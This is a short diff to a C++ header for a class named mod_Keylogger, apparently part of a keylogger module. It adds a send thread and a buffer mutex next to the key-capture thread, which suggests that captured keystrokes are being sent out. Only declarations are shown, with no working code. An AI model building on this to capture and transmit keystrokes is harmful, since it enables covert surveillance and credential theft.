@@ -10,11 +10,16 @@ class mod_Keylogger {
 		void Start();
 		void Stop();
 		void CaptureKeys();
+		void SendThread();
 
 	private:
+		std::mutex mtx_buffer;
 		std::mutex mtx_Run;
+
 		bool isRunning = false;
+		
 		std::thread thKey;
+		std::thread thSend;
 };
 
 #endif
